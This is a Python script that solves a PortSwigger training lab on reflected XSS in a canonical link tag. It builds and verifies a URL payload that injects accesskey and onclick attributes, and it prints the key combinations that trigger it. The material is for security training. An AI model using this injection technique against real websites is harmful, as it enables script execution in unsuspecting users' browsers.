#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS in canonical link tag
Prints the exploit URL — requires user interaction (accesskey press) to trigger.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 17: Reflected XSS in canonical link tag"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Verify the canonical link tag reflects the URL
    r = s.get(lab)
    if 'rel="canonical"' in r.text:
        print("[+] Canonical link tag found in page source")
    else:
        print("[-] No canonical link tag found")

    # Step 2: Build the exploit URL
    payload = "?'accesskey='x'onclick='alert(1)"
    exploit_url = f"{lab}/{payload}"
    print(f"\n[+] Exploit URL:\n    {exploit_url}")

    # Step 3: Verify payload is reflected in the canonical tag
    r = s.get(exploit_url)
    if "accesskey" in r.text and "onclick" in r.text:
        print("[+] Payload reflected in canonical link tag")
    else:
        print("[-] Payload not found in response")

    print("\n[*] This is a user-interaction XSS — press the accesskey combo in a browser:")
    print("    Windows/Linux Chrome: Alt + Shift + X")
    print("    macOS Chrome: Ctrl + Alt + X")
    print("    Firefox (all): Alt + Shift + X")

    # Step 4: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("\n[+] Lab solved!")
    else:
        print("\n[*] Open the exploit URL in a browser and press the accesskey combo to solve")


if __name__ == "__main__":
    main()
